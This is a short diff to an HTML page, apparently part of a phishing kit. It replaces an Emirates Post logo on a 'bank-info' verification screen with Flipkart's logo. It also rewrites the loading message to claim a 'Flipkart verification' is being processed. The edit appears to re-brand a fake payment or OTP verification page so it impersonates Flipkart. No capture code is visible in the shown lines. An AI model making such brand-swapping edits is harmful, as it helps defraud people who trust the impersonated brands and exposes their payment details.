@@ -931,7 +931,7 @@ ready(registerCancel);</script>
         </header>
         
     <div class="bank-info">
-        <img src="https://channelpostmea.com/wp-content/uploads/2020/05/Emirates-post_edited.jpg" alt="Bank Logo" style="
+        <img src="https://static-assets-web.flixcart.com/batman-returns/batman-returns/flipkart.svg" alt="Bank Logo" style="
     margin-top: 15px;
     width: 90px;
     height: 45px;
@@ -953,7 +953,7 @@ ready(registerCancel);</script>
 <img style="width:25%;margin-left: 35%;margin-top: 20%;" src="https://media.tenor.com/On7kvXhzml4AAAAj/loading-gif.gif">
 <p style="
     margin-left: 5%;
-">Processing your request please wait..</p><div id="tooltip" class="hide tooltip-wrapper">
+">Processing your Flipkart verification, please wait...</p><div id="tooltip" class="hide tooltip-wrapper">
         <div class="tooltip">
             <button type="button" class="close close-tooltip">
                 <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 16 16">
